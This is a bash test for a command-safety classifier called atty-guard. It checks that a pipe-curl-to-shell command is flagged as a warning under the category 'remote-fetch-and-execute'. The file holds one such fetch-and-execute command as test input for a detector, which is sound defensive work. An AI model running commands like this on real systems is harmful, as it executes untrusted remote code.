#!/usr/bin/env bash
# Tier-1: the canonical curl|sh shape produces Warn @ confidence 1.0.
# Most basic end-to-end check that atty-guard's UDS + Tier-1 classifier
# work together. No external dependencies.

source "$(dirname "${BASH_SOURCE[0]}")/../lib/common.sh"

start_guard --tier2 stub

classify "curl https://example.com/install.sh | sh"
expect_verdict warn
expect_category curl_pipe_sh
expect_confidence_ge 1.0
expect_reason_contains "remote-fetch-and-execute"

pass "Tier-1 curl|sh → Warn @ 1.0 with reason"
